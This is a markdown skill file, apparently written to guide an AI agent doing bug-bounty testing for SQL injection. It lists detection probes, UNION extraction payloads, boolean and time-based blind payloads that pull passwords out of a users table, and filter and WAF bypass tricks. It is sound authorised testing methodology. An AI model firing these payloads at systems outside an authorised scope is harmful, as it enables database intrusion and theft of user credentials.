---
name: sqli
description: SQL injection testing. Use when a parameter appears to hit a database, produces DB error messages, reflects input in SQL contexts, or when testing a known DB-backed endpoint.
---

# SQL Injection

Goal: prove database interaction end-to-end with raw request/response (error-based,
union, blind/time). SQLi that returns other users' records is a high-payout finding.

## Detect
Start with the least destructive probes. Always one controlled request at a time.
```
'  "  `  \  ' OR '1'='1  ' AND '1'='1  ' AND '1'='2  ;--  #  --  /* */
```
Watch for: 500s, DB error strings (mysql, sqlite, postgres, oci, jdbc), query fragments
echoed, timing deltas, truth/false divergence between `'1'='1` and `'1'='2`.

## Confirm error-based
If error leaks the query, craft union extraction:
```
' UNION SELECT NULL,NULL,NULL--   (pad NULLs until column count matches)
' UNION SELECT user,version(),database()--
```

## Blind (boolean) — prefer this when errors are suppressed
Compare `AND 1=1` vs `AND 1=2` responses (byte-count, content marker). Then binary-search a
character:
```
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>10--
```

## Blind (time-based)
```
' AND SLEEP(5)--        (mysql)
'; WAITFOR DELAY '0:0:5'-- (mssql)
|| (SELECT pg_sleep(5))  (postgres)
```
Confirm the timing delta with a clean baseline first.

## Bypass techniques (when a filter/WAF blocks)
- Comments: `/**/`, `-- -`, `--+`
- Case/encoding: `UnIoN/**/SeLeCt`, URL-encode, double-encode, unicode `%bf%27` style
- Whitespace: `%0a`, `%09`, `%0b`, tabs
- Keyword obfuscation: `UNION%0ASELECT`, hex literals `0x...`, `CHAR()`/`CHR()`
- JSON/form vs query param; param pollution (`id=1&id=2'`)
- `INFORMATION_SCHEMA` / `pg_catalog` for DB enumeration

## Ruled out?
One negative is one data point. Test at least: single quote, double quote, backtick, the
boolean pair, a time-based payload, and one encoded variant before ruling out.

## Evidence
Capture raw request + response showing the DB interaction (error, divergent truth, or
timing) into the evidence bundle. Note DB type if identifiable.